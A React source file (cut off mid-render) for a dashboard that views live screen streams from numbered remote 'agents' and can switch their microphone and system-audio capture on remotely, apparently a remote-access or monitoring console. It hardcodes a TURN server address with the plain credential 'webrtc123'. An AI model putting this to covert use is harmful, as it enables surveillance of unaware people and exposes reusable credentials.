import React, { useState, useEffect, useRef } from 'react';
import { Box, Button, Grid, Typography, IconButton, Chip } from '@mui/material';
import {
  Computer as ComputerIcon,
  Stop as StopIcon,
  SwapHoriz as SwapIcon,
  Fullscreen as FullscreenIcon,
  Mic as MicIcon,
  MicOff as MicOffIcon,
  VolumeUp as VolumeUpIcon,
  VolumeOff as VolumeOffIcon
} from '@mui/icons-material';
import socketService from '../services/socket';
import api from '../services/api';

const SOCKET_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

/* ---------------------------------------------------------------
   Graphite design tokens — keep in sync with pages/index.css
   --------------------------------------------------------------- */
const T = {
  bg:         '#0b0c0e',
  bgElevated: '#111316',
  panel:      '#15181c',
  panelRaised:'#1b1f24',
  panelHover: '#232830',
  border:     'rgba(255,255,255,0.06)',
  borderStrong:'rgba(255,255,255,0.10)',
  borderHi:   'rgba(255,255,255,0.18)',
  text:       '#eef1f4',
  textSoft:   '#c4c9d0',
  textDim:    '#8a929d',
  textMuted:  '#5a626d',
  ok:         '#b9c2cc',
  okSoft:     'rgba(185,194,204,0.10)',
  bad:        '#c98a8a',
  badSoft:    'rgba(201,138,138,0.10)',
  font:       '"Inter","Bahnschrift","Segoe UI",system-ui,sans-serif',
  mono:       '"JetBrains Mono","SF Mono",Menlo,ui-monospace,monospace',
};

/* Reusable button-style mixins -------------------------------- */
const ghostBtn = {
  borderColor: T.borderStrong,
  color:       T.textSoft,
  bgcolor:     'transparent',
  fontFamily:  T.font,
  fontWeight:  500,
  fontSize:    '13px',
  letterSpacing:'0.01em',
  textTransform:'none',
  borderRadius:'10px',
  px: 1.6, py: 0.8,
  '&:hover': {
    borderColor: T.borderHi,
    bgcolor:     T.panelHover,
    color:       T.text,
  },
};

const iconBtn = {
  color: T.textDim,
  border: `1px solid ${T.borderStrong}`,
  borderRadius: '10px',
  width: 36, height: 36,
  '&:hover': {
    borderColor: T.borderHi,
    color: T.text,
    bgcolor: T.panelHover,
  },
};

const dangerBtn = {
  ...ghostBtn,
  color: T.bad,
  borderColor: 'rgba(201,138,138,0.30)',
  '&:hover': {
    bgcolor: T.badSoft,
    borderColor: 'rgba(201,138,138,0.55)',
    color: T.bad,
  },
};

/* Tiny pill --------------------------------------------------- */
const pill = (active = false) => ({
  height: 26,
  borderRadius: '999px',
  bgcolor: T.panelRaised,
  border: `1px solid ${active ? T.borderHi : T.borderStrong}`,
  color: active ? T.text : T.textDim,
  fontFamily: T.font,
  fontSize: '11px',
  letterSpacing: '0.06em',
  '& .MuiChip-icon': { color: 'inherit', fontSize: 14, ml: '8px' },
  '& .MuiChip-label': { px: '10px' },
});

/* =============================================================
   StreamWindow — Screen Stream
   ============================================================= */
export default function StreamWindow() {
  const [streaming, setStreaming] = useState(false);
  const [streamFrame, setStreamFrame] = useState(null);
  const [monitors, setMonitors] = useState([]);
  const [selectedMonitor, setSelectedMonitor] = useState(null);
  const [agentId, setAgentId] = useState(null);
  const [showMonitorSelect, setShowMonitorSelect] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [microphoneActive, setMicrophoneActive] = useState(true);
  const [systemAudioActive, setSystemAudioActive] = useState(true);
  const [useWebRTC, setUseWebRTC] = useState(true); // WebRTC по умолчанию
  const [audioStateLoaded, setAudioStateLoaded] = useState(false);

  // --- Bitrate / FPS metrics -------------------------------
  const [fps, setFps]   = useState(0);
  const [kbps, setKbps] = useState(0);

  const streamingRef = useRef(false);
  const selectedMonitorRef = useRef(null);
  const streamSessionRef = useRef(0);
  const audioContextRef = useRef(null);
  const lastPlayTimeRef = useRef(0);
  const socketRef = useRef(null);
  const agentIdRef = useRef(null);

  // WebRTC refs
  const peerConnectionRef = useRef(null);
  const remoteVideoRef = useRef(null);

  // Audio reconnection refs
  const audioReconnectTimeoutRef = useRef(null);
  const isReconnectingRef = useRef(false);
  const videoCheckTimeoutRef = useRef(null);

  // metric ref counters reset each second
  const frameCountRef = useRef(0);
  const byteCountRef  = useRef(0);

  useEffect(() => { streamingRef.current = streaming; }, [streaming]);
  useEffect(() => { selectedMonitorRef.current = selectedMonitor; }, [selectedMonitor]);
  useEffect(() => { agentIdRef.current = agentId; }, [agentId]);

  // Tick once per second to publish FPS / Kbps
  useEffect(() => {
    const id = setInterval(() => {
      setFps(frameCountRef.current);
      setKbps(Math.round((byteCountRef.current * 8) / 1024)); // kbit/s
      frameCountRef.current = 0;
      byteCountRef.current  = 0;
    }, 1000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('agentId');
    setAgentId(id);
    agentIdRef.current = id;

    // Ждем пока socket подключится
    const checkSocket = () => {
      const socket = socketService.socket;
      if (!socket) {
        console.log('[WebRTC] Waiting for socket...');
        setTimeout(checkSocket, 100);
        return;
      }

      console.log('[WebRTC] Socket ready');
      socketRef.current = socket;

      const handleResult = (data) => {
      console.log('[WebRTC] Received command_result:', data);
      if (data.agent_id === parseInt(id)) {
        console.log('[WebRTC] Agent ID matches, parsing result');
        try {
          const parsed = JSON.parse(data.result);
          console.log('[WebRTC] Parsed result:', parsed);

          // Синхронизация состояния аудио с агентом
          if (parsed.audio_state) {
            console.log('[WebRTC] Loading audio state from agent:', parsed.audio_state);
            setMicrophoneActive(parsed.audio_state.microphone || false);
            setSystemAudioActive(parsed.audio_state.system_audio || false);
            if (!audioStateLoaded) {
              setAudioStateLoaded(true);
            }
          }

          if (parsed.monitors) {
            console.log('[StreamWindow] Setting monitors:', parsed.monitors);
            setMonitors(parsed.monitors);
            setShowMonitorSelect(false);
            // НЕ запускаем автоматически - пользователь сам нажмет Start
          } else {
            console.log('[WebRTC] No monitors in parsed result');
          }

          if (parsed.stream_frame && streamingRef.current) {
            if (parsed.monitor === selectedMonitorRef.current) {
              setStreamFrame(parsed.stream_frame);
              // Track bitrate (base64 length ≈ 4/3 of raw bytes)
              frameCountRef.current += 1;
              byteCountRef.current  += Math.floor((parsed.stream_frame.length * 3) / 4);
            }
          }

          if (parsed.audio_chunk && (parsed.source === 'microphone' || !parsed.source)) {
            playAudioChunk(parsed.audio_chunk, parsed.rate || 16000, parsed.channels || 1);
          }
        } catch (e) {
          console.error('Error parsing result:', e);
        }
      }
    };

    console.log('[WebRTC] Subscribing to command_result');
    socket.on('command_result', handleResult);

    // Запрашиваем мониторы после подключения socket
    const requestMonitors = () => {
      if (!socket.connected) {
        console.log('[WebRTC] Waiting for socket to connect...');
        setTimeout(requestMonitors, 100);
        return;
      }

      console.log('[WebRTC] Socket connected, requesting monitors');
      console.log('[WebRTC] Agent ID:', id);
      if (id) {
        // Добавляем небольшую задержку чтобы агент успел подключиться
        setTimeout(() => {
          console.log('[WebRTC] Requesting monitors for agent', id);
          api.post(`/api/agents/${id}/command`, { command: 'get_monitors' })
            .then(res => console.log('[WebRTC] Monitors request sent, response:', res))
            .catch(err => console.error('[WebRTC] Error getting monitors:', err));
        }, 500);
      } else {
        console.error('[WebRTC] No agent ID found!');
      }
    };

    requestMonitors();

    // Запрашиваем текущее состояние аудио
    if (id) {
      setTimeout(() => {
        api.post(`/api/agents/${id}/command`, { command: 'get_audio_state' })
          .then(res => console.log('[WebRTC] Audio state request sent'))
          .catch(err => console.error('[WebRTC] Error getting audio state:', err));
      }, 500);
    }

    return () => {
      console.log('[WebRTC] Cleanup: unsubscribing from command_result');
      if (streaming && agentId) stopScreenStream();
      socket.off('command_result', handleResult);

      // Очищаем таймер переподключения
      if (audioReconnectTimeoutRef.current) {
        clearTimeout(audioReconnectTimeoutRef.current);
      }
    };
  };

  checkSocket();
}, []);

  const startStreamWithMonitor = async (monitorIndex) => {
    streamSessionRef.current += 1;
    const currentSession = streamSessionRef.current;

    if (streaming) {
      try {
        if (useWebRTC) {
          stopWebRTCStream();
        } else {
          await api.post(`/api/agents/${agentId}/command`, { command: 'stop_screen_stream' });
        }
        await new Promise(r => setTimeout(r, 1000));
        setStreaming(false);
        setStreamFrame(null);
      } catch (err) { console.error('Error stopping stream:', err); }
    }

    if (currentSession !== streamSessionRef.current) return;

    setSelectedMonitor(monitorIndex);
    setShowMonitorSelect(false);
    setStreamFrame(null);

    try {
      if (useWebRTC) {
        await startWebRTCStream(monitorIndex);
      } else {
        await api.post(`/api/agents/${agentId}/command`, {
          command: 'start_screen_stream',
          params: { interval: 0.2, monitor_index: monitorIndex }
        });
        if (currentSession === streamSessionRef.current) setStreaming(true);
      }
    } catch (err) { console.error('Error starting stream:', err); }
  };

  const stopScreenStream = () => {
    if (useWebRTC) {
      stopWebRTCStream();
    } else {
      api.post(`/api/agents/${agentId}/command`, { command: 'stop_screen_stream' })
        .then(() => {
          setStreaming(false);
          setStreamFrame(null);
          setSelectedMonitor(null);
        })
        .catch(err => console.error('Error stopping stream:', err));
    }
  };

  const changeMonitor = () => {
    if (streaming) stopScreenStream();
    setShowMonitorSelect(true);
  };

  const toggleFullscreen = () => {
    if (!isFullscreen) {
      document.documentElement.requestFullscreen();
      setIsFullscreen(true);
    } else {
      document.exitFullscreen();
      setIsFullscreen(false);
    }
  };

  const reconnectWebRTCWithDelay = () => {
    if (!useWebRTC || !streaming || isReconnectingRef.current) {
      return;
    }

    // Отменяем предыдущий таймер если есть
    if (audioReconnectTimeoutRef.current) {
      clearTimeout(audioReconnectTimeoutRef.current);
    }

    // Ждем 600ms чтобы избежать множественных переподключений
    audioReconnectTimeoutRef.current = setTimeout(async () => {
      if (!streamingRef.current || isReconnectingRef.current) {
        return;
      }

      console.log('[WebRTC] Reconnecting due to audio settings change...');
      isReconnectingRef.current = true;

      try {
        const currentMonitor = selectedMonitorRef.current;

        // Останавливаем текущее соединение
        if (peerConnectionRef.current) {
          peerConnectionRef.current.close();
          peerConnectionRef.current = null;
        }
        if (remoteVideoRef.current) {
          remoteVideoRef.current.srcObject = null;
        }

        // Отписываемся от старых событий
        if (socketRef.current) {
          socketRef.current.off('webrtc_answer');
          socketRef.current.off('webrtc_ice_candidate');
        }

        // Ждем чтобы соединение точно закрылось и агент освободил ресурсы
        await new Promise(r => setTimeout(r, 400));

        // Проверяем что стрим все еще активен
        if (!streamingRef.current) {
          isReconnectingRef.current = false;
          return;
        }

        // Запускаем новое соединение
        await startWebRTCStream(currentMonitor);
        console.log('[WebRTC] Reconnection completed');
      } catch (err) {
        console.error('[WebRTC] Reconnection error:', err);
      } finally {
        isReconnectingRef.current = false;
      }
    }, 600);
  };

  const toggleMicrophone = async () => {
    try {
      const newState = !microphoneActive;
      const command = newState ? 'enable_microphone' : 'disable_microphone';

      // Сразу обновляем UI для отзывчивости
      setMicrophoneActive(newState);

      await api.post(`/api/agents/${agentId}/command`, { command });
      console.log('[WebRTC] Microphone toggled:', newState);

      // Переподключаем WebRTC если стрим активен
      if (streaming && useWebRTC) {
        reconnectWebRTCWithDelay();
      }
    } catch (err) {
      console.error('Error toggling microphone:', err);
      // Откатываем состояние при ошибке
      setMicrophoneActive(!microphoneActive);
    }
  };

  const toggleSystemAudio = async () => {
    try {
      const newState = !systemAudioActive;
      const command = newState ? 'enable_system_audio' : 'disable_system_audio';

      // Сразу обновляем UI для отзывчивости
      setSystemAudioActive(newState);

      await api.post(`/api/agents/${agentId}/command`, { command });
      console.log('[WebRTC] System audio toggled:', newState);

      // Переподключаем WebRTC если стрим активен
      if (streaming && useWebRTC) {
        reconnectWebRTCWithDelay();
      }
    } catch (err) {
      console.error('Error toggling system audio:', err);
      // Откатываем состояние при ошибке
      setSystemAudioActive(!systemAudioActive);
    }
  };

  const playAudioChunk = (base64Audio, sampleRate, channels) => {
    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)();
        lastPlayTimeRef.current = audioContextRef.current.currentTime;
      }
      const audioContext = audioContextRef.current;
      const currentTime = audioContext.currentTime;

      const binaryString = atob(base64Audio);
      const len = binaryString.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) bytes[i] = binaryString.charCodeAt(i);

      const int16Array = new Int16Array(bytes.buffer);
      const float32Array = new Float32Array(int16Array.length);
      for (let i = 0; i < int16Array.length; i++) float32Array[i] = int16Array[i] / 32768.0;

      const audioBuffer = audioContext.createBuffer(channels, float32Array.length / channels, sampleRate);
      for (let channel = 0; channel < channels; channel++) {
        const channelData = audioBuffer.getChannelData(channel);
        for (let i = 0; i < channelData.length; i++) {
          channelData[i] = float32Array[i * channels + channel];
        }
      }

      const source = audioContext.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(audioContext.destination);

      let startTime;
      if (lastPlayTimeRef.current < currentTime || (lastPlayTimeRef.current - currentTime) > 2.0) {
        startTime = currentTime;
      } else {
        startTime = lastPlayTimeRef.current;
      }
      source.start(startTime);
      lastPlayTimeRef.current = startTime + audioBuffer.duration;
    } catch (err) {
      console.error('[AUDIO] Error playing audio chunk:', err);
    }
  };

  // ============================================================
  // WebRTC Functions
  // ============================================================
  const startWebRTCStream = async (monitorIndex) => {
    const currentAgentId = agentIdRef.current || agentId;
    console.log('[WebRTC] startWebRTCStream called, monitorIndex:', monitorIndex, 'agentId:', currentAgentId);

    if (!currentAgentId) {
      console.error('[WebRTC] Cannot start stream: agentId is null');
      return;
    }

    try {
      const pc = new RTCPeerConnection({
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          // Собственный TURN сервер для надежного NAT traversal
          {
            urls: [
              'turn:141.147.45.169:3478',
              'turn:141.147.45.169:3478?transport=tcp'
            ],
            username: 'webrtc',
            credential: 'webrtc123'
          }
        ],
        iceCandidatePoolSize: 10,
        bundlePolicy: 'max-bundle',
        rtcpMuxPolicy: 'require'
      });
      console.log('[WebRTC] PeerConnection created with TURN support for NAT traversal');

      pc.ontrack = (event) => {
        console.log('[WebRTC] ontrack event:', event);
        console.log('[WebRTC] Track kind:', event.track.kind);
        console.log('[WebRTC] Track id:', event.track.id);
        console.log('[WebRTC] Track readyState:', event.track.readyState);
        console.log('[WebRTC] Track enabled:', event.track.enabled);
        console.log('[WebRTC] Track muted:', event.track.muted);
        console.log('[WebRTC] remoteVideoRef.current:', remoteVideoRef.current);
        console.log('[WebRTC] event.streams[0]:', event.streams[0]);

        if (event.streams[0]) {
          const stream = event.streams[0];
          console.log('[WebRTC] Stream id:', stream.id);
          console.log('[WebRTC] Stream active:', stream.active);
          console.log('[WebRTC] Video tracks:', stream.getVideoTracks().length);
          console.log('[WebRTC] Audio tracks:', stream.getAudioTracks().length);

          stream.getVideoTracks().forEach((track, i) => {
            console.log(`[WebRTC] Video track ${i}:`, {
              id: track.id,
              kind: track.kind,
              enabled: track.enabled,
              muted: track.muted,
              readyState: track.readyState,
              settings: track.getSettings()
            });
          });
        }

        if (remoteVideoRef.current && event.streams[0]) {
          // Устанавливаем srcObject только один раз (при первом треке)
          if (!remoteVideoRef.current.srcObject) {
            remoteVideoRef.current.srcObject = event.streams[0];
            console.log('[WebRTC] srcObject set, playing video');
            remoteVideoRef.current.play().catch(e => console.error('[WebRTC] Play error:', e));

            // Логируем когда видео начинает воспроизводиться
            const videoElement = remoteVideoRef.current;
            const checkFrame = () => {
              if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
                console.log('[WebRTC] Video frame detected:', videoElement.videoWidth, 'x', videoElement.videoHeight);
              } else {
                console.log('[WebRTC] No video dimensions yet:', videoElement.videoWidth, 'x', videoElement.videoHeight);
              }
            };
            videoElement.addEventListener('loadeddata', checkFrame);
            videoElement.addEventListener('playing', () => {
              checkFrame();
              // Включаем звук после начала воспроизведения
              setTimeout(() => {
                if (videoElement.muted) {
                  videoElement.muted = false;
                  console.log('[WebRTC] Audio unmuted after playback started');
                }
              }, 500);
            });

            // Проверяем через 3 секунды
            setTimeout(() => {
              console.log('[WebRTC] After 3s - videoWidth:', videoElement.videoWidth, 'videoHeight:', videoElement.videoHeight);
              console.log('[WebRTC] After 3s - readyState:', videoElement.readyState);
              console.log('[WebRTC] After 3s - paused:', videoElement.paused);
              console.log('[WebRTC] After 3s - currentTime:', videoElement.currentTime);
            }, 3000);
          } else {
            console.log('[WebRTC] srcObject already set, skipping');
          }
        }
      };

      pc.onicecandidate = (event) => {
        console.log('[WebRTC] ICE candidate:', event.candidate);
        if (event.candidate && socketRef.current) {
          socketRef.current.emit('webrtc_ice_candidate', {
            agent_id: currentAgentId,
            candidate: event.candidate
          });
        }
      };

      socketRef.current.on('webrtc_answer', async (data) => {
        console.log('[WebRTC] Received answer:', data);
        if (data.agent_id == currentAgentId) {
          await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
        }
      });

      socketRef.current.on('webrtc_ice_candidate', async (data) => {
        console.log('[WebRTC] Received ICE candidate:', data);
        if (data.candidate) {
          try {
            await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
            console.log('[WebRTC] ICE candidate added from agent');
          } catch (e) {
            console.error('[WebRTC] Failed to add ICE candidate:', e);
          }
        }
      });

      const offer = await pc.createOffer({
        offerToReceiveVideo: true,
        offerToReceiveAudio: true
      });
      await pc.setLocalDescription(offer);
      console.log('[WebRTC] Offer created:', offer);

      console.log('[WebRTC] Socket connected:', socketRef.current?.connected);
      console.log('[WebRTC] Socket ID:', socketRef.current?.id);
      console.log('[WebRTC] Emitting webrtc_offer to agent:', currentAgentId);
      socketRef.current.emit('webrtc_offer', {
        agent_id: parseInt(currentAgentId),
        offer: offer,
        monitor_index: monitorIndex,
        viewer_sid: socketRef.current.id
      });
      console.log('[WebRTC] webrtc_offer emitted');

      peerConnectionRef.current = pc;
      setStreaming(true);
      console.log('[WebRTC] Stream started');
    } catch (err) {
      console.error('[WebRTC] Error starting stream:', err);
    }
  };

  const stopWebRTCStream = () => {
    console.log('[WebRTC] Stopping stream...');

    // Отменяем таймер переподключения если есть
    if (audioReconnectTimeoutRef.current) {
      clearTimeout(audioReconnectTimeoutRef.current);
      audioReconnectTimeoutRef.current = null;
    }
    isReconnectingRef.current = false;

    // Отменяем проверку видео
    if (videoCheckTimeoutRef.current) {
      clearTimeout(videoCheckTimeoutRef.current);
      videoCheckTimeoutRef.current = null;
    }

    // Отписываемся от событий
    if (socketRef.current) {
      socketRef.current.off('webrtc_answer');
      socketRef.current.off('webrtc_ice_candidate');
    }

    if (peerConnectionRef.current) {
      peerConnectionRef.current.close();
      peerConnectionRef.current = null;
    }
    if (remoteVideoRef.current) {
      remoteVideoRef.current.srcObject = null;
    }

    // Отправляем команду на сервер для остановки стрима
    api.post(`/api/agents/${agentId}/command`, { command: 'stop_webrtc_stream' })
      .then(() => {
        console.log('[WebRTC] Stop command sent to agent');
      })
      .catch(err => console.error('[WebRTC] Error sending stop command:', err));

    setStreaming(false);
    setStreamFrame(null);
    setSelectedMonitor(null);
  };

  useEffect(() => {
    const handleFullscreenChange = () => setIsFullscreen(!!document.fullscreenElement);
    document.addEventListener('fullscreenchange', handleFullscreenChange);
    return () => document.removeEventListener('fullscreenchange', handleFullscreenChange);
  }, []);

  /* ----- Sub-components ------------------------------------ */
  const StatusDot = ({ live }) => (
    <Box sx={{
      width: 6, height: 6, borderRadius: '50%',
      bgcolor: live ? T.ok : T.textMuted,
      boxShadow: live ? `0 0 0 3px ${T.okSoft}` : 'none',
      animation: live ? 'pulse-dot 2.4s ease-in-out infinite' : 'none',
      '@keyframes pulse-dot': {
        '0%,100%': { opacity: 1 },
        '50%':     { opacity: 0.45 }
      }
    }}/>
  );

  const Metric = ({ label, value, unit }) => (
    <Box sx={{
      display: 'flex', flexDirection: 'column', alignItems: 'flex-start',
      px: 1.4, py: 0.6,
      borderLeft: `1px solid ${T.border}`,
      minWidth: 70,
    }}>
      <Typography sx={{
        color: T.textMuted, fontSize: '9.5px', letterSpacing: '0.18em',
        textTransform: 'uppercase', fontFamily: T.font, lineHeight: 1,
      }}>{label}</Typography>
      <Box sx={{ display: 'flex', alignItems: 'baseline', gap: 0.5, mt: 0.5 }}>
        <Typography sx={{
          color: T.text, fontFamily: T.mono, fontSize: '13px',
          fontWeight: 600, lineHeight: 1, fontVariantNumeric: 'tabular-nums',
        }}>{value}</Typography>
        <Typography sx={{
          color: T.textMuted, fontFamily: T.mono, fontSize: '10px', lineHeight: 1,
        }}>{unit}</Typography>
      </Box>
    </Box>
  );

  /* ----- Render -------------------------------------------- */
  return (
    <Box sx={{
      width: '100vw', height: '100vh',
      bgcolor: T.bg,
      display: 'flex', flexDirection: 'column',
      overflow: 'hidden', position: 'relative',
      fontFamily: T.font, color: T.text,
      '&::before': {
        content: '""', position: 'absolute', inset: 0,
        background: `radial-gradient(ellipse at 50% 0%, rgba(255,255,255,0.025), transparent 55%)`,
        pointerEvents: 'none',
      }
    }}>
      {/* Header / Toolbar */}
      <Box sx={{
        position: 'relative', zIndex: 10,
        px: 2.5, py: 1.5,
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        gap: 2, flexWrap: 'wrap',
        bgcolor: T.panel,
        borderBottom: `1px solid ${T.border}`,
        backdropFilter: 'blur(10px)',
      }}>
        {/* Left: title + chips */}
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, flexWrap: 'wrap' }}>
          <Box sx={{
            width: 32, height: 32, borderRadius: '8px',
            bgcolor: T.panelRaised, border: `1px solid ${T.borderStrong}`,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            color: T.textDim,
          }}>
            <ComputerIcon sx={{ fontSize: 16 }}/>
          </Box>
          <Box>
            <Typography sx={{
              color: T.textMuted, fontSize: '10px', letterSpacing: '0.18em',
              textTransform: 'uppercase', lineHeight: 1, mb: 0.4,
            }}>screen stream</Typography>
            <Typography sx={{
              color: T.text, fontSize: '14px', fontWeight: 600, lineHeight: 1,
              letterSpacing: '-0.005em',
            }}>
              {agentId ? `Agent #${agentId}` : 'Disconnected'}
            </Typography>
          </Box>

          {streaming && selectedMonitor !== null && (
            <Chip
              icon={<ComputerIcon sx={{ fontSize: 12 }}/>}
              label={`Monitor ${selectedMonitor + 1}`}
              size="small"
              sx={pill(true)}
            />
          )}

          <Box sx={{
            display: 'inline-flex', alignItems: 'center', gap: 1,
            px: 1.2, height: 26, ml: 0.5,
            bgcolor: T.panelRaised, border: `1px solid ${T.borderStrong}`,
            borderRadius: '999px',
          }}>
            <StatusDot live={streaming && !!streamFrame}/>
            <Typography sx={{
              color: streaming && streamFrame ? T.text : T.textDim,
              fontSize: '10.5px', letterSpacing: '0.14em',
              textTransform: 'uppercase', fontFamily: T.font,
            }}>{streaming && streamFrame ? 'live' : (streaming ? 'syncing' : 'idle')}</Typography>
          </Box>

          {/* Bitrate / FPS panel */}
          {streaming && (
            <Box sx={{
              display: 'flex', alignItems: 'stretch', height: 36,
              bgcolor: T.panelRaised, border: `1px solid ${T.borderStrong}`,
              borderRadius: '10px', overflow: 'hidden', ml: 0.5,
            }}>
              <Metric label="fps"  value={fps}  unit=""    />
              <Metric label="rate" value={kbps} unit="kb/s"/>
            </Box>
          )}
        </Box>

        {/* Right: controls */}
        <Box sx={{ display: 'flex', gap: 1, alignItems: 'center' }}>
          {/* WebRTC toggle - всегда видна */}
          <Button
            variant="outlined"
            onClick={() => {
              console.log('[WebRTC] Toggle clicked, current:', useWebRTC);
              if (streaming) stopScreenStream();
              setUseWebRTC(!useWebRTC);
            }}
            sx={{
              ...ghostBtn,
              ...(useWebRTC && {
                color: T.ok,
                borderColor: 'rgba(185,194,204,0.30)',
                bgcolor: T.okSoft,
              }),
            }}
          >
            {useWebRTC ? 'WebRTC (HD)' : 'Legacy'}
          </Button>

          {streaming && (
            <>
              <IconButton
                onClick={toggleMicrophone}
                title={microphoneActive ? 'Stop Microphone' : 'Start Microphone'}
                sx={{
                  ...iconBtn,
                  ...(microphoneActive && {
                    color: T.text,
                    borderColor: T.borderHi,
                    bgcolor: T.panelHover,
                  }),
                }}
              >
                {microphoneActive ? <MicIcon sx={{ fontSize: 16 }}/> : <MicOffIcon sx={{ fontSize: 16 }}/>}
              </IconButton>

              <IconButton
                onClick={toggleSystemAudio}
                title={systemAudioActive ? 'Stop System Audio' : 'Start System Audio'}
                sx={{
                  ...iconBtn,
                  ...(systemAudioActive && {
                    color: T.text,
                    borderColor: T.borderHi,
                    bgcolor: T.panelHover,
                  }),
                }}
              >
                {systemAudioActive ? <VolumeUpIcon sx={{ fontSize: 16 }}/> : <VolumeOffIcon sx={{ fontSize: 16 }}/>}
              </IconButton>

              <Button
                variant="outlined"
                startIcon={<SwapIcon sx={{ fontSize: 16 }}/>}
                onClick={changeMonitor}
                sx={ghostBtn}
              >Change monitor</Button>

              <IconButton onClick={toggleFullscreen} title="Fullscreen" sx={iconBtn}>
                <FullscreenIcon sx={{ fontSize: 16 }}/>
              </IconButton>

              <Button
                variant="outlined"
                startIcon={<StopIcon sx={{ fontSize: 16 }}/>}
                onClick={stopScreenStream}
                sx={dangerBtn}
              >Stop</Button>
            </>
          )}
        </Box>
      </Box>

      {/* Content area */}
      <Box sx={{
        flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center',
        p: 3, position: 'relative',
      }}>
        {/* Monitor selection or Start button */}
        {(!streaming || showMonitorSelect) && (
          <Box sx={{ textAlign: 'center', maxWidth: 920, width: '100%' }}>
            {monitors.length > 0 ? (
              <>
                <Typography sx={{
                  color: T.textMuted, fontSize: '11px', letterSpacing: '0.18em',
                  textTransform: 'uppercase', mb: 1,
                }}>display source</Typography>
                <Typography sx={{
              color: T.text, fontSize: '20px', fontWeight: 600, mb: 4,
              letterSpacing: '-0.01em',
            }}>Select monitor</Typography>

            <Grid container spacing={2} justifyContent="center">
              {monitors.map((monitor, index) => (
                <Grid item key={index}>
                  <Button
                    onClick={() => startStreamWithMonitor(index)}
                    sx={{
                      width: 220, height: 170,
                      display: 'flex', flexDirection: 'column', gap: 1.2,
                      bgcolor: T.panel,
                      border: `1px solid ${T.border}`,
                      borderRadius: '14px',
                      color: T.text,
                      textTransform: 'none',
                      transition: 'all .18s ease',
                      '&:hover': {
                        borderColor: T.borderHi,
                        bgcolor: T.panelRaised,
                      }
                    }}
                  >
                    <Box sx={{
                      width: 44, height: 44, borderRadius: '10px',
                      bgcolor: T.panelRaised,
                      border: `1px solid ${T.borderStrong}`,
                      display: 'flex', alignItems: 'center', justifyContent: 'center',
                      color: T.textDim, mb: 0.5,
                    }}>
                      <ComputerIcon sx={{ fontSize: 22 }}/>
                    </Box>
                    <Typography sx={{
                      color: T.text, fontSize: '14px', fontWeight: 600,
                      letterSpacing: '-0.005em',
                    }}>Monitor {index + 1}</Typography>
                    <Typography sx={{
                      color: T.textMuted, fontFamily: T.mono, fontSize: '11px',
                      letterSpacing: '0.04em',
                    }}>{monitor.width} × {monitor.height}</Typography>
                  </Button>
                </Grid>
              ))}
            </Grid>
              </>
            ) : (
              // Если мониторов нет - показываем простую кнопку Start
              <Button
                variant="outlined"
                onClick={() => startStreamWithMonitor(0)}
                sx={{
                  ...ghostBtn,
                  px: 3,
                  py: 1.2,
                  fontSize: '14px',
                }}
              >
                Start Stream (Monitor 1)
              </Button>
            )}
          </Box>
        )}

        {/* Waiting for stream */}
        {streaming && !useWebRTC && !streamFrame && !showMonitorSelect && (
          <Box sx={{ textAlign: 'center' }}>
            <Box sx={{
              width: 56, height: 56, mx: 'auto', mb: 2,
              borderRadius: '50%',
              border: `2px solid ${T.border}`,
              borderTopColor: T.textDim,
              animation: 'spin 1s linear infinite',
              '@keyframes spin': {
                '0%':   { transform: 'rotate(0deg)' },
                '100%': { transform: 'rotate(360deg)' }
              }
            }}/>
            <Typography sx={{
              color: T.textDim, fontSize: '12px',
              letterSpacing: '0.16em', textTransform: 'uppercase',
            }}>Waiting for stream…</Typography>
          </Box>
        )}

        {/* Stream display — player frame */}
        {streaming && (streamFrame || useWebRTC) && !showMonitorSelect && (
          <Box sx={{
            position: 'relative',
            maxWidth: '100%', maxHeight: '100%',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            p: isFullscreen ? 0 : '6px',
            bgcolor: isFullscreen ? 'transparent' : T.panel,
            border: isFullscreen ? 'none' : `1px solid ${T.border}`,
            borderRadius: isFullscreen ? 0 : '14px',
            boxShadow: isFullscreen ? 'none' : '0 20px 60px -20px rgba(0,0,0,0.7)',
          }}>
            {useWebRTC ? (
              <video
                ref={remoteVideoRef}
                autoPlay
                playsInline
                muted={true}
                style={{
                  display: 'block',
                  maxWidth: '100%',
                  maxHeight: isFullscreen ? '100vh' : 'calc(100vh - 140px)',
                  objectFit: 'contain',
                  borderRadius: isFullscreen ? 0 : '10px',
                  border: isFullscreen ? 'none' : `1px solid ${T.border}`,
                  backgroundColor: '#000',
                }}
              />
            ) : (
              <img
                src={`data:image/jpeg;base64,${streamFrame}`}
                alt="Screen stream"
                style={{
                  display: 'block',
                  maxWidth: '100%',
                  maxHeight: isFullscreen ? '100vh' : 'calc(100vh - 140px)',
                  objectFit: 'contain',
                  borderRadius: isFullscreen ? 0 : '10px',
                  border: isFullscreen ? 'none' : `1px solid ${T.border}`,
                }}
              />
            )}

            {/* Overlay HUD inside player */}
            {!isFullscreen && (
              <Box sx={{
                position: 'absolute', top: 14, left: 14,
                display: 'inline-flex', alignItems: 'center', gap: 1,
                px: 1.2, height: 24,
                bgcolor: 'rgba(11,12,14,0.72)',
                border: `1px solid ${T.borderStrong}`,
                borderRadius: '999px',
                backdropFilter: 'blur(8px)',
              }}>
                <StatusDot live/>
                <Typography sx={{
                  color: T.text, fontSize: '10px', letterSpacing: '0.16em',
                  textTransform: 'uppercase', fontFamily: T.font,
                }}>rec</Typography>
                <Box sx={{ width: '1px', height: 10, bgcolor: T.border, mx: 0.5 }}/>
                <Typography sx={{
                  color: T.textSoft, fontFamily: T.mono, fontSize: '10.5px',
                  fontVariantNumeric: 'tabular-nums',
